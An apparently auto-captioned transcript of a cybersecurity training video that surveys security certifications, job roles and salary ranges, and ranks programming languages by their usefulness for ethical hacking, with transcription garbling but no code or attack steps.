in today's world it is more on the
business side that everyone uh starts
making sense so for example when you
start talking to the management you
always will talk about it uh about
security from a monetary perspective and
a business impact analysis perspective
so as we go ahead in id security uh
career paths you will always mature from
a technical guy to a semi technical
guide to a and then over over a period
to a managerial person and then probably
the c-level executives like uh the ciso
the cfo of the or the cto chief
technology officer so let's start with
the next topic the cloud computing
courses as discussed these are not
mandatory but with today's
world where we have everybody has jumped
on to the cloud computing bandwagon you
will want to expand your horizons and
get cloud security under your belt as
well the two courses on your screen the
ccsp and the ccsk are vendor neutral
courses and are more towards a
managerial perspective rather than
technical perspective so the ccsp is the
certificate of cloud security
professional this certification is given
to you by isc square whereas the ccsk is
a certificate of cloud security
knowledge given to you by an
organization called cloud security
alliance ccsp the the certificate of
cloud security professionals again has a
holistic view of cloud security they
have listed six different domains in the
certification and ic square has created
a common body of knowledge based on
which it will give you an holistic view
of what steps do you want to look at for
various deployments in a cloud security
now this becomes an advanced
certification uh the first certification
that came across was the ccsk which is
from a body a non-profit organization
called cloud security alliance now this
is again a web-based examination this
one is a little bit easier to attend
than the ccsp so if you want to enter
the cloud security arena i would suggest
you start with the ccsk certificate and
then move on to ccsp if it is technical
that you haven't uh that you have in
mind then you become vendor-specific so
either you go for amazon web services
for a public cloud or microsoft azure or
if you want to look at private clouds
we've got vmware certifications and
we've got microsoft hyper-v we've got
citrix certifications so depending on
which vendor or which solution that you
want to deal with you'll have to
identify those vendors and you'll have
to get certified on those specific
technologies each vendor has their own
set of certifications you can just visit
their websites and they have a career
path for their individual certifications
there as well let's talk about advanced
cyber security courses now the gold
standard and advanced cyber security
courses are obviously the sis or the
cissp which is the certified information
systems security professional so when
you're headed for the management courses
or or you're going to look at profiles
like the chief technology officer or the
chief information security officer
you're looking at this particular course
this is a very difficult exam to crack
because you need that experience you
just cannot read books get the knowledge
from those books and pass this exam in
fact you have to prove that you have
five years of experience in two of the
domains that cissp talks about if you
don't you can still attempt the exam but
you get certified as an associate of the
isc square for cissp and you've got six
years to complete the five-year
experience bracket the passing rate of
that exam is less than 50 percent so uh
it's a tough exam to crack currently
there are the exam consists of 100 to
150 questions and you have to answer
those in uh three hours now that sounds
like a simple task but the areas that
are covered in this certification are
vast and the knowledge that is required
and the experience that is required is
very high as well i have seen people
gain around 15 years of experience in
the id field and then attempt the cissp
that being said i've also seen people
with a very good knowledge clear the
exam in uh in a couple of by studying
for just a couple of weeks so it depends
on how good you are how good your
knowledge is how good your experience is
how good your understanding on various
topics is and based on that you can
crack this exam easily as well the
domains in cissp are as such we start
off with asset security uh then we have
security architecture and engineering
communications and network security
identity and access management security
operations security assessment and
testing software development security
and security and risk management now we
start off with security and risk
management it talks about again the risk
assessment strategies risk assessments
life cycles uh risk calculators and a
lot of other terminology like an annual
loss expenditure expectancy a single
loss expectancy etc asset security will
talk about physical assets or data
assets and how you're going to secure
them and the strategies revolving that
security architecture and engineering
will talk about models security models
or frameworks that will help us create a
policy and administer that policy on our
organization communication and network
obviously we'll talk about network
security different protocols this topic
is all about mapping the osi layer the
tcp layer understanding which protocols
work where and uh the various encryption
strategies that are there in securing
communications identity and access
management uh this talks about uh access
control lists single sign-ons and so on
so forth security operations the
day-to-day operations of a security
operation center where you're going to
look at incident management change
management and problem management
security assessment and testing
vulnerability assessment and penetration
testing software development security
the software development life cycle
where you're going to talk about secure
coding practices in an application
you're going to talk about various
models that are utilized like the
waterfall model or the agile model to be
implemented for application security so
if you remember some slides back we were
talking about the various domains in
cyber security now if you map that's
those slides with this you will
understand that cisa speed basically
governs everything that works in the iit
security space so it needs a lot of
understanding a lot of knowledge for
this certification so let's talk about
the job roles in cyber security now
every organization will have its own
naming convention
and their job titles so this may vary a
little bit in the real world but these
are the baseline job requirements and
job functions that would be available or
that are required in today's world in
cyber security so let's start talking
about these roles so the first one is
chief information and security officer
also known as cso or ciso now this is a
very privileged position and is a
managerial position in the organization
here you own the cyber security of the
entire organization and your job role is
to ensure proper policies proper
frameworks and proper standards are
followed in your organization so it's a
very holistic view that you have there's
no hands-on involved you will not be
involved in vapt but you may actually
ask your team to conduct a vulnerability
assessment and penetration test if needs
requires you'll just take the reports
analyze them and guide the rest of the
team in how to proceed with those
particular incidents so you start off
with at least a graduate degree in
computer science or an id security or a
masters that's a given your
certifications could be all of these or
any of these a cissp is a required
certificate at this point in time the
system's auditor systems manager or the
risk management certification would
obviously help your cause and help you
gain that knowledge that is required for
this particular job rule now since this
is a managerial rule the requirement is
also very high you will have to have at
least 15 years of experience before you
reach this position so you already
should have worked in the id security
field in multiple domains you should
have had these certifications during
this period which would then qualify you
to become a cso of an organization your
skills obviously would be ethical
hacking no hands-on but you understand
those attacks you know how they have
done you are conversant with how these
technologies work you know the osi layer
the tcp layer you know networking you
know how attacks can be created and
perpetrated computer forensics knowledge
of that would obviously be necessary
over here or would be an advantage if
you are certified in uh forensic
investigations because in case of a
breach you can guide the team of where
exactly to look for what kind of data
mobile security for uh if your
organization has a bring your own device
policy that will help you understand how
to implement security parameters and how
to control data that is going to leave
your organization on some employees
mobile phones an example here would be
employees configuring their emails on
their mobile phones and thus the
attachments can be downloaded on those
phones and you want to ensure that those
documents or attachments to not get
compromised cloud security is also
necessary here because most of the
organizations that you will see will be
connected to a cloud or will be
consuming some services from the cloud
for example salesforce customer
relationship management softwares or
office 365 getting integrated with an
in-house domain networking knowledge is
a must your work experience like i said
would be around 15 years minimum and you
should have worked in network security
you should know storages you should have
a basic understanding of how hardware
works you should have skills on vendor
management and protection protecting
systems against advanced persistent
threats so you should know how idss ipss
work you should know the latest trends
in the security market and you should
understand which vendors to approach at
one point in time salaries could range
from 100 000 usd to 125 000 or in india
15 lakh rupees to 25 lakh rupees now
these are baseline salaries it will
obviously depend on what kind of an
organization you are joining if it's a
startup your salaries may not be that
high or if it's a global organizations
your salaries could be way more than
what have been projected on the screen
the next role we can talk about is an
information security analyst now here
again the requirement is that you
understand security from a holistic
perspective you're going to collect data
you're going to analyze that data and
you're going to interpret that data
based on your knowledge based on your
experience and try to figure out if
there is something wrong or if there is
something dishonest going on in the
organization for example collecting a
data dump of a networking device uh for
a segment of time and then analyzing the
packets that are going through that
particular segment to see if there are
any background services running any
background data leakages happening or it
could be as simple as you joining a
security operation center and when an
incident arises you become that security
analyst where you analyze the incident
you try to investigate what has happened
and then you come out with what exactly
has been impacted and then try to find a
resolution for that so your baseline
again is uh you're going to be a
graduate in computer science or an id
security field masters will always be
helpful but here it is not required a
bachelor's degree is more than
sufficient so the certifications that
you'll require uh here are the cisa plus
which is the cyber security analyst from
comptia and the ec counselor security
analyst from ec council now these two
certificates help you understand
how you can collect data what data
sources are available and how to
configure them and how to analyze that
data that is what these courses are all
about the cissp course again here would
be an added advantage for you to
understand how to convert that data into
risk analysis and then give a business
impact analysis to your manager along
with the technical report so the skills
that you're going to require for this
job information assurance assurance is
the part where you are investigating to
ascertain that the security controls
that have been implemented are working
correctly for example there is a
security architect who has identified
that a firewall needs to be placed and
there's a configuration that has been
done on the firewall a security analyst
over a period of time will analyze the
effectiveness of that particular
firewall and see if there any gaps or if
there are any problems with the device
and if it needs any more fine tuning you
will also need to know a little bit of
scripting languages so python it's a
scripting language and when we say linux
over here we're obviously talking about
the bash scripting scenario where you
can create your own scripts and use
those scripts to analyze certain
scenarios cryptography again encryption
understanding of encryption how it works
because you're going to analyze that
kind of data so cryptography is a
required skill set network security is a
must across all platforms across all
roles because that's how computers
communicate with each other over the
intranet and the internet work
experience network architecture so
courses like ccna ccnp ccie would be
helpful for you to understand how
network works now this is assuming that
you're using cisco devices for other
devices like juniper there are different
courses from those vendors log
management so understanding how a syslog
server works or how a siem tool works
and utilizing those tools to collect
data and use that data to for further
analysis the salary here could vary from
95 to 123 000 usd or 5 lakhs to 18 lakhs
per annum in india again the salaries
are baselines depends on which
organization you're joining startup may
not be able to pay you that much global
organization could pay you a lot more
than what is being showcased but these
are the average salaries across all job
roles right so let's talk about the
forensic computer analyst job profile so
the forensic computer analyst job role
is where your job description would be
to analyze after attack has been
identified or an impact has been
observed in your organization so this
job role would definitely be after the
attack has happened so you will be going
in and you're going to try to analyze
what got impacted how did that attack
happen which all components have been
affected and if there has been any data
breach so the other role would be where
you're going to do a reverse engineering
trying to identify who attacked you ip
addresses mac addresses or any traits
that you can find of the attacker and
how exactly did the attack take place
what was the vulnerability what was the
exploit and that would give you a
knowledge which you can pass on to the
security analyst who can then further
try to resolve that particular problem
your certifications would be chfi which
is a certified hacking forensic
investigation certificate that we saw
from ec council there are other
certificates in the market as well such
as cfce and gcfa the skills that you're
going to require here are analytical
skills you're going to analyze a lot of
data now understand the fact that the
attack has happened it has been
identified by some reason and you are
being tasked with the uh requirement of
identifying what exactly happened what
got affected and to what extent has been
the damage so you're trying to reverse
engineer something that has already
happened and you're going to try to
think of how attacker would have created
that particular attack obviously you
will have to create reports after that
your report writing skills should be
excellent your communication should be
somewhat of a techno managerial kind of
a scenario so you should be technical
you know all the technical things but
you can translate them into simple
english for non-technical people to
understand now understand the fact that
when you send these reports to the
management the management will have
basic understanding of those keywords
they would not be technically adept of
hacking or off forensics so your report
writing skills would be a huge
requirement at this point in time your
communications how you communicate with
your peers how you're going to
communicate your requirements what you
want for that analysis what kind of
tools do you require and when you create
those reports and you're going to
communicate them or you're going to
present them to the management in very
precise manner that's where your
communication skills would be required
and your knowledge on digital storage
devices where you're going to acquire
data and you're going to store that data
for example there may be scenarios where
a law enforcement agency may come in and
you will have to collect that data in a
manner where you have to store it and
then present it in a court as evidence
later on so here some requirements would
be where you know the law of the land
and you know how to acquire that
evidence how to store that evidence you
know the chain of custody so that you
can present that data in a court of law
and prove that it is still valid data
your work experience you should know
your operating systems how those
processes work where the cache is how is
it stored how is data processed so that
you can access those areas of the
operating systems or those applications
and you can extract that data from those
storage areas scripting languages would
be required for you to create let's say
powershell scripts or bash scripts
depending on the operating system and
then automate some tasks for collecting
some data data processing skills because
you're going to collect data you're
going to process that data you're going
to look at processes that are running in
the background so all of that would be
required as a work experience salary
again would vary from 69 to 114 000 usd
and in india around 5 lakhs to 18 lakhs
per annum looking at a security
architect's role so a security architect
is a person who designs an architect
security so your job role would be where
let's say there's a network deployment
that's going to happen and you are being
called in to design a plan on how you
want to implement security on the entire
network or you could be on the cloud and
you want a new deployment on the cloud
and you're talking about cloud security
so here you're going to design how that
security is going to function your job
roles would be where you want to place
those firewalls what kind of firewalls
you want to place or what kind of idss
ips's unified threat management systems
or endpoint antivirus systems would be
required here you would be looking at
security controls and placement of those
security controls in various scenarios
for example what kind of email filters
do you want to create or what kind of
email
scanning you want to implement in your
organization to scan incoming
attachments or outgoing emails another
example would be where you are looking
at routing and you're looking at how
data packets are going to travel across
the network and you have some dedicated
parts that you have to create to ensure
that all those packets go through a
firewall a firewall is configured in a
particular manner which will either
allow or disallow that packet based on
the configuration that you are going to
suggest again the baseline would be
graduate in a computer science or an iit
security field here a master's degree
would be advisable over the period of
your career right uh and again your
courses like ceh the certified ethical
hacking course or the security plus or
the ecs ecsa course the ec council
certified security analyst course would
be prescribed cissp is open across all
tables across all job roles so as you
get experience and you've got at least
five years of experience that's when you
try to attempt the cssp certification
when you start off with ceh then you
move on to ecsa security plus and then
that's your career path uh to become a
security architect again the experience
here would be at least seven to eight
years in i.t security to become a
successful security architect at an
organizational level skills operating
systems application security cloud
security network security you're
basically you're going to design the
security of an organization or of a
particular product so you need to know
almost anything and everything there is
about information technology work
experience as suggested seven to eight
years is ideal but anything between five
to ten years would be a requirement in
id security the five to ten years of
experience that we are talking about is
entirely in id security so you either
have a vulnerability um management
experience or a patch management
experience or you have experience in
application security or in network
security so all of that combined should
be around five to ten years for you to
become a successful security architect
salaries would range from fifty thousand
to a hundred thousand us dollars and six
lakhs to twenty lakhs in india and
rupees then let's talk about id security
consultant now the main job role of a
consultant is to provide intelligence on
various technologies so here you could
become a business consultant where you
may need to go to the client side check
the requirements come back to your
organization and then detail the team of
the requirements and then map the
solutions that you're going to offer
based on those requirements or a client
needs to implement a security
architecture or needs to implement
security controls you as a consultant
just advise them how it is done what is
required what kind of policies should be
there and then provide that expertise to
them so this is basically more of a
business oriented role from a security
perspective this is where you have to
know it all so not only technical but
you'll also need to have knowledge on
how businesses function uh what kind of
security controls are available and
which security controls to position at
what security areas so again physical
security is also in play you're going to
talk about cctv cameras you're going to
talk about physical security about
server rooms you're going to talk about
disaster recovery and business
continuity planning so this basically
becomes a consultant's view of how a
business should function in the long run
again the educational requirement a
graduate degree in computer science or
i.t security or a master's degree is
advisable at this point in time cissp
crisc cism these are a must like i said
these are advanced certifications and
this is an advanced job profile as well
so assuming you have cissp
that already assumes that you probably
would have done your ceh or security
plus or scissor plus and those
certifications earlier on in your career
path here programming skills again you
shouldn't be a developer that's not a
requirement but you should understand
programming you should look at secure
coding practices and you should
understand how those practices are to be
implemented in a software development
lifecycle risk management is a must at
this point in time you need to identify
threats you need to identify how those
threats are posing at risk to the
organization your risk management skills
how you're going to calculate that risk
and present it to the management not
only the next skill not only firewalls
but ids ips's any security controls that
you can implement including identity
access and management knowing your
operating systems is a must windows
linux or maybe mac the various flavors
of linux operating systems and
understanding of encryption uh let's see
how the public key infrastructure works
what is a private key what is a public
key symmetric and asymmetric encryption
and all of those details is something
that you should know work experience a
minimum around five to ten years of
professional experience after which you
can be eligible for it security
consultants job role salaries could vary
from eighty thousand to eighty six
thousand us dollars and 5 lakhs to 19
lakhs in indian rupees then we have the
security systems administrator job
profile uh this is the systems
administrator from a security
perspective so so you're not going to be
an administrator from uh administrators
perspective such as administering
windows or linux operating systems or
the deployments but you would be
responsible for the security of these
operating systems and creating a secure
environment for the internal consumption
of the organization so as a security
systems administrator your job role
would be to administrate let's say
firewalls or the security of certain
switches routers or data traffic or
you're going to analyze data traffic or
you're going to create rules of which
protocols are allowed to pass through
the firewall and which protocol should
be blocked the requirements again
educational wise you should be a
graduate in computer science or id
security comptia security plus ch ccnp
ccna these are the certifications that
you want to look at to become a system
administrator skills computers networks
is a must so networking skills
understanding uh of how ospf pgp
protocols work maybe even wipe so sip
protocol comes into the picture here
understanding the tcp and the osi layer
how these function at what layer which
protocol works how these protocols
translate into each other and how the
data packet is transmitted firewalls any
security controls and your operating
systems work experience around four to
seven years of experience in the network
field would allow you to be eligible for
a systems security administrator profile
salary here could be around hundred
thousand two hundred and ten thousand
and in india it would be around two
lakhs to nine lakh indian rupees then we
have the id security engineer now the id
security engineer would be a job role
where you are run you are a part of the
security operations center and there are
incidents that come on in daily talk for
the organization which you are going to
investigate and you're going to try to
resolve those incidents so again
graduate in computer science or an id
security graduation would be required
ceh ccnp ccna or security plus these are
the certifications that you want to look
at problem solving skills that's a must
because you're going to be solving those
problems on a day-to-day basis and you
will have certain time frames that you
have to adhere to computer languages uh
that's if you are going to be an
application security engineer as well
where you want to debug some problems
later on to analyze what the root cause
was and then try to translate that into
and try to create a resolution based on
that analysis support skills because
you're going to support the day-to-day
activity of the organization so whenever
there is an incident you will be the
person who would be called you're going
to support these individuals who have
faced these incidents and you're going
to resolve this problems for them if the
organization is using a cloud cloud
knowledge would be required for example
there was an incident that happened on
office 365 and you're called in to
analyze and collect logs from those
particular deployments so your
understanding of cloud would help you at
that point in time networking obviously
yes because again like i said network is
the way we're going to communicate on
the internet and the internet so those
skills would be required across all i.t
job profiles in the security field work
experience you should know security
control experience in securing cloud
maybe an itil or itil the information
technology infrastructure library
certification would be something that
you want to look at because
that talks about incident management
problem management and change management
which is something that you'll be doing
on a daily basis as a security engineer
salaries would vary from 106 to 129 000
uh us dollars or 3 lakhs to 10 lakhs
indian rupees then we have a penetration
testers profile now this is completely
technical this is where you are an
ethical hacker so you're going to craft
exploits you're going to create those
attacks and you're going to try and
figure out if those attacks can be
successful against an organization and
if yes you're going to create those
reports and send it to your manager so
it's a complete hands-on role complete
technical role and this is where your
knowledge about anything and everything
that is technical in the computer field
is a must so again a graduate degree in
information technology or cyber security
ch security plus an lpt now ceh
certified ethical hacker or security
plus these are baselines where
penetration testing is taught so these
courses basically talk about ethical
hacking what are the requirements of
ethical hacker how you're going to
utilize these tools and how you're going
to create those attacks so these are
hands-on certifications which teach you
how these attacks work how to recreate
those attacks yourselves and what to
expect out of those attacks lpt or the
license penetration tester is an
advanced certification which comes after
the ecsa course pc council security
analyst course so this as it as the name
says is a license from ec council which
gives you a certificate to showcase that
you have the required skills to become a
penetration tester your skills problem
solving scripting languages would be 100
necessary at this point in time because
you're going to create your own attacks
so you may have a requirement where you
have to create your own powershell
script to create an attack or a bash
script or maybe writing an exploit in
metasploit in ruby language knowledge of
operating systems and software so how
applications work what is the
application programming interface what
is a common gateway interface how do
they transmit data how do they handle
data how do applications talk to each
other how do applications talk to a
database and vice versa all of those
requirements come into the picture
networking protocols of course
networking like i said across all job
profiles in iit security work experience
two to four years of experience in
security with practice and penetration
testing so two to four years as a
penetration tester now the question is
if you don't have experience then how do
you become a penetration tester so
there's a lot of bug bounty programs
that where you can enroll and you can do
it as a freelancer to get hone your
skills and when you get those bounties
against your name you can use them as
experienced in your profiles which will
be counted against those two to four
years of experience as a penetration
tester again salaries would be from 50
500 usd to 100 000 uh in indian rupees
it would be around three and a half
lakhs to 12 lakhs per annum so these are
the job rules in cyber security let's
understand the importance of knowing
programming for hacking
you might wonder if programming is a
necessity to become a hacker
as you might be aware hacking involves
breaking the protocols and exploiting a
network thus being a hacker requires you
to understand the languages of the
software that you are focusing on
hence it is required that a hacker knows
coding having zero coding knowledge will
definitely limit your opportunities in
the future
knowing different programming languages
is undoubtedly an asset for hackers
everyone wants to become a hacker today
however it is not as easy as it is shown
in numerous movies it takes plenty of
practice and programming knowledge to
become an ethical hacking expert
if you want to become a hacker it is
imperative that you have a knack for
programming languages it is a known fact
that some of the world's best hackers
started off as programmers
if you know how to program you will be
able to dissect a code and analyze it
you can write your scripts or malware
that can be used on the victim yes there
are several ready-made scripts available
today however you might need to apply
your skills in case the available
scripts don't work well for you
sometimes when script modification is
required you should be in a position to
do that in such a scenario zero
knowledge of the respective programming
language will definitely be a hindrance
programs can also help you automate
multiple tasks which would normally take
a lot of time
codes allow you to penetrate different
fields you want to hack it will help you
identify the plan behind an attack and
defend against deadly hacking techniques
and make your cybersecurity career
worthwhile
it will help you understand the working
of the target system or application
before carrying out an exploit
now that we have an idea as to why
programming is important for hackers let
us understand which programming
languages should a hacker learn
there are several programming languages
for hacking and it might be overwhelming
to choose from the endless list
here we are to help you with that
do keep in mind that your choice of
programming language will also depend on
the type of system you are targeting and
your strategy
let us now move on to the list of the
top programming languages that are
extensively used by hackers around the
world
as you see on your screens here we have
the top five programming languages for
hackers let us go through them one by
one
number one on our list is one of the
most popular programming languages today
that is python
python is a general purpose programming
language and in the field of hacking it
is mainly used for exploit writing
it is referred to as the de facto
hacking programming language it plays a
crucial role in writing hacking scripts
exploits and malicious programs
one great feature that makes hacking
easy with python is the availability of
ready-made modules for example os
modules are available if the target is a
native operating system
for networking there is a socket module
and a lot more
python socket programming can be used
for discovering vulnerabilities in a
system since python code helps in
checking the security integrity of
systems and it can also be used to
exploit them
python has a massive community that
helps with third party plugins every day
it is also an easy to read language with
a simple syntax this will be helpful for
beginners
you can easily write automation scripts
using python and it also makes
prototyping much faster
moving on to our second programming
language we have javascript
currently javascript is one of the best
programming languages for hacking web
applications
a good understanding of javascript
allows a hacker to discover
vulnerabilities and carry web
exploitation since most of their web
apps use javascript or one of its
libraries
knowing javascript will help you
discover flaws in web applications
javascript can be used to read saved
cookies and security experts also use
javascript to develop cross-site
scripting programs for hacking
javascript is known for carrying out
attacks like cross-site scripting
javascript can also be used to spread
and reproduce malware and viruses easily
initially javascript was a client-side
scripting language however with the
release of node.js it now supports
back-end development
this implies a larger field for
exploitation
a hacker can now use javascript to snoop
the type towards inject malicious code
and track browsing history to name a few
number three on our list is php
hyper text preprocessor or php is a
dynamic server side programming language
that is used to build websites
hackers should understand php as it will
help them understand web hacking
techniques better
especially if you're into web hacking
then getting your hands on php would be
an asset
php is used in server side scripting
using php you could write a custom
application that modifies settings on a
web server and makes a target server
susceptible to attacks
with the help of php you can also
eliminate any vulnerabilities in your
code
php is one of the most powerful server
side languages used in most of the web
domains
this shows how learning php can help you
with web hacking and also help you fight
against malicious attackers
popular content management systems run
on a foundation of php hence having a
strong knowledge of php can help you
protect or compromise such websites
next on a list of the best programming
languages for hackers is sql
sql is the acronym for structured query
language
although sql is not a traditional
programming language it is a language
used for only communicating with
databases
several systems like mysql postgresql
store their data in databases
sql is used to interact with such
databases in order to organize add
retrieve delete or edit data from a
database
having an in-depth knowledge of sql lets
you comprehend the structure of a
database thereby helping you decide
which scripts or tools to deploy
sql is used for the purpose of web
hacking sql is undoubtedly the best
programming language when it comes to
hacking into large databases
it will be impossible to contract
database attacks without a good
understanding of sql
using sql hackers can perform an attack
known as sql injection attack such an
attack enables hackers to access
confidential information from databases
sql is used by hackers to develop
various hacking programs based on sql
injection
sql injection is used to bypass web
application login algorithms that are
weak
such an attack can also help a hacker
view and modify confidential information
from databases
finally at number 5 we have the c
programming language
it is no surprise that we have c the
mother of all programming languages on
our list
it is used massively in the security
field
it helps with exploit writing and
development
the low level nature of c provides an
edge over other programming languages
used for hacking
a hacker can use the c programming
language to his or her advantage when it
comes to accessing low-level hardware
components such as the ram
security professionals mostly you see
when they are required to manipulate
system resources and hardware
c also helps penetration testers write
programming scripts
most operating systems and computer
programs are coded in c language hence
learning c you will help hackers get an
overview of the structure of operating
systems
c is also used to create shell codes
root kits exploits build undetectable
malware keyloggers and much more
sometimes it is also advisable to learn
both c and c plus as they both come in
handy for hackers
so those were our top five programming
languages for hackers do keep in mind
that the most important step of becoming
a hacker is to learn various programming
languages it will be great if you can
master a variety of programming
languages as your target will not be the
same always on that note in addition to
previously mentioned programming
languages we have an additional list of
languages that are also well recognized
for hacking let's have a look at our
honorary mention
first we have ruby the ruby programming
language has been used for exploitation
for quite some time now
there can be a close comparison drawn
between ruby and python based on its
syntax however ruby is more web focused
ruby can be used to write either small
or large scripts and can be used
interchangeably with bash scripting
it offers good flexibility while writing
exploits ruby has been used by several
hackers to exploit corporate systems it
is not that easy to master ruby and that
is one reason why mncs look for
professionals who know ruby
second we have pearl although pearl has
lost its old fame it still holds value
in the hacker community for exploit
writing
there are systems that still run on perl
as it was the go to solution once
it is a great language that can help you
manipulate linux text files and help you
create tools and exploits
perl code bases still do occupy a
considerable portion of corporate tools
third on our list is html
many of you might have wondered why we
didn't mention html yet
yes no programming list is complete
without mentioning html
the hypertext markup language html is a
standard markup language used for
creating web pages
it glows the whole internet together and
it is the language of the web
this shows the importance html has
an understanding of html is vital to
play with web applications
html also finds its use in developing
hybrid mobile and desktop apps
html is a must if you want to master
this field having said that html is not
that tough for language to learn hence
it is advised to master html if you want
to compromise web applications
and finally at 4 we have assembly level
language it is undoubtedly one of the
most powerful yet hardest programming
languages to learn
it is a complicated low-level
programming language
for hacking primitive systems assembly
is one of the best programming languages
the best part of assembly is that you
can instruct machine hardware or
software using it
assembly language helps a hacker
manipulate systems straight up at the
architecture level
it is also the most suited coding
language to build malware like viruses
and trojans
it is considered to be the best language
for jobs that are time critical
reverse engineers use assembly language
for example if you're interested in
software cracking and if you want to
reverse engineer a piece of software
that has already been compiled assembly
is the go-to choice
as complicated as a language sounds the
results it produces are highly fruitful
so those were the additional programming
languages that can help you become a
skilled and successful hacker we should
keep in mind that a strong understanding
of programming languages helps cyber
security professionals stay on top of
cyber criminals
importance of the cyber security
certification first and foremost when i
see a certification i look at it from
three different aspects the first is the
training itself which allows me to gain
the knowledge which allows me to
understand the aspects of security or
whatever the certification is there for
the second aspect is the exam itself how
do i need to prepare myself for the exam
and how do i need to approach the exam
how do i need to ensure that i pass in
my first attempt and the third aspect is
the certification itself which allows me
to be eligible to apply for a particular
job role so obtaining a cyber security
certification ensures or shows uh to the
organization that you're applying to
that you do have that prerequisite
knowledge and you should be shortlisted
for an interview the knowledge that you
have gained during the training will
help you when you attend that interview
and when you attempt to answer the
questions asked to you so these
certifications are designed for a
specific role uh for example a forensic
investigation certificate will teach you
how to investigate a crime scene
forensically a digital crime scene for a
matter of fact a certified ethical
hacking course will teach you about
penetration testing so it is you who is
going to decide which certification you
require and then attempt get certified
on it of course a fresher with a cyber
security certification will have better
employment opportunities because they
can showcase their knowledge with the
certification that they already have
even professionals who want to enhance
their careers can get into managerial or
advanced certifications to improve on
their knowledge and get promoted in
their job profiles so cyber security
certifications can be classified in
three different aspects the first one
being the foundational level then the
managerial level and the advanced level
in the previous video we just had a
small overview here we are going to
discuss about what the certification
covers how the exams are conducted and
the price points for each and every exam
so let's start with the foundational
certifications we start off with ccna
which is the basic certification for
networking so the ccna routing and
switching certification basically it
helps you build your networking career
you will join an organization as a
networking engineer where you can help
the organization establish the routing
the pathing of how data packets will
travel across the network this
certification covers all the basic
concepts that you require to understand
networking the basic requirements for
this certification are that the
candidate must have a bachelor's degree
but apart from that there are no other
prerequisites so it's just that you need
a bachelor's degree and then you can
apply uh you can study for this you can
undergo a training and then you can
attempt the exam uh the certification
provider obviously is cisco so the
knowledge that is limited to this
training and certification is for cisco
devices only the exam fees for this
certification is approximately 325
dollars the exam when it is conducted uh
it has around 50 to 60 odd questions
which need to be answered in 19 minutes
the type of questions that you're going
to get is multiple choice questions
where you have a question and four
answers and you have to choose the
correct answers among those drag and
drop where you have to click on an
object and drag it to its appropriate
place probably uh architectural diagram
and you have to let's say pick on a
router and place it into a particular
position if you place it correctly you
answer the
answer the question correctly otherwise
it's wrong and a simulator where you go
where there could be a configuration you
need to configure it in a particular
manner and then check whether the
configuration is correct or not the pass
mark is around 800 to 850 out of a
possible thousand marks so each question
will have a different weightage
depending on the depth of the question
depending on the difficult level of the
question or the difficulty level of the
question which uh would then count
towards your marks and if you score 800
to 850 that's when you clear the exam
the job rules as we have discussed over
here would be more more on the network
administrator side or a network engineer
site depending on the level of
experience that you have the salaries
that are expected from these job roles
in the us are around fifty five thousand
dollars to ninety thousand dollars
annually the next one is the komcha
certification called security plus
kamcha is also a global certification
authority for
infosec courses so this certification
teaches candidates on how to secure
applications networks and devices it
focuses on hands-on practical skills in
the field of network security i have
trained people on this certification
myself so i know this certification is
quite hands-on it deals with the
concepts to the core it helps you
understand the concepts and then in the
practical hands-on demo you need to
execute the practical yourself so that
you can gain that knowledge the
recommended level for a candidate to
attempt this training would be at least
around two years of experience in the it
sector in addition if you have already
been certified for network plus
certification from comchia which is the
baseline networking certification this
is also a preferred way to go for this
certification as said komcha is the
certificate provider and the exam fees
for this certification is
339. the exam is quite simple 90
questions in 90 minutes that's one
minute per question it sounds like a lot
of time but believe me the questions can
be a little bit confusing can be a
little bit lengthy so you will require
all those 90 minutes to answer those
questions especially when they're tricky
and they're technical in nature the
questions would be multiple choice and
performance based the pass mark for this
exam is around 750 points out of a
possible 900. the job profiles for this
kind of certification is when you want
to apply for a security analyst position
or a security engineer's position where
you're going to analyze some data to
understand and figure out what problems
are ongoing in the organization uh the
average annual salary of this person
would be around 72 000
then comes the ceh or the certified
ethical hacker training from ec council
now this is a very well-known course and
also uh ac council is a global
certifying authority very well accepted
across a lot of countries
this is an offensive certification so
here you're basically trying to become a
penetration tester you're taught how to
hack you're taught how to attack a
particular organization from an ethical
hacker's perspective so the job profiles
that you'll be looking here are of a pen
tester where you go into an organization
you test their security controls or you
test their devices find out flaws within
them and then provide recommendations of
how to plug those flaws or mitigate
those flaws and improve the security of
that organization it is recommended that
you have two years of experience at
least in networking or security for
these uh to attempt this kind of
trainings and certifications again a
basic understanding of networking maybe
a little bit of applications operating
systems would be necessary before
attempting this certification the
certification provider is ec council and
the exam fees for this certification is
so the exam here would be 125 questions
which needs to be attempted in four
hours and you will only get multiple
choice questions in here now for ceh
there are two exams one is the multiple
choice questions and the second is a
practical exam where
you need to solve some given problems to
you in a ilab scenario and if you are
able to solve them properly you then get
certified for ceh practical the cutoff
varies from 65 to 85 percent depending
on the questions that you have answered
and the weightage associated with each
and every question as said the job roles
would be as a penetration tester a
security engineer and your salaries
would start from around 90 000 annually
then comes the cnd or the certified
network defender also from ec council
now this is more on the network defense
side so here again the job rules would
be where you're where there's a network
that you have and you're going to try to
secure the network and the
communications that are going to travel
over the network so you need to be a
network administrator network security
engineer or
in a similar profile to understand how
networks work and then you're going to
attempt to secure those networks the
certificate provider again is ec council
and the certification is placed a little
bit below ceh so it becomes network
defense then ceh where you're going to
become a penetration tester the exam
fees for this certification is 350 us
dollars the exam the exam is of 100
questions to be answered in four hours
again it's just a multiple choice
questions so you get a question with
four options you answer the correct one
and you move on to the next question the
past percentage again varies from 60 to
85 percent depending on the questions
answered and the weightage of that
question job rules to be applied network
defense technician cnd analyst or a
security analyst from a network
perspective salaries would range from 65
000 to 75 000 per annum then comes the
forensic investigator course which is
exactly what it is digital forensic
investigator this will help you
understand how computers work where data
is stored and how you can retrieve that
data to investigate a crime that has
taken place so the candidate must have
at least two years of experience in the
information security sector they need a
good understanding of how networks work
how computers work how operating systems
work how they store data
the location where that data is stored
how databases work how those databases
store those data and so on so forth this
certification is sought after
mainly in the law enforcement areas but
there are a few corporates that offer
forensic investigation as a service
especially when a corporate gets
compromised and they want to
conduct their own investigations the
certification provider for this is also
ac council and the exam fees are 500
this is an advanced level certification
so uh understanding of applications
networks and operating systems is a must
before you attempt this the exam is
quite similar 150 questions in four
hours again it's just a multiple choice
question exam the cutoff again is from
60 to 85 percent depending on the
questions and the weightage of each and
every question job rules i.t security
specialist network security pro the job
roles forensic investigators law
enforcement agencies security
specialists homeland security jobs and
your salaries would be around 88 000 and
above all right now let's talk about the
managerial level certifications kobit
stands for control objectives for
information and related technologies
it's a certification that will give a
candidate an in-depth knowledge of the
framework for which cobit is all about
and the framework helps you manage and
govern enterprise id environments now
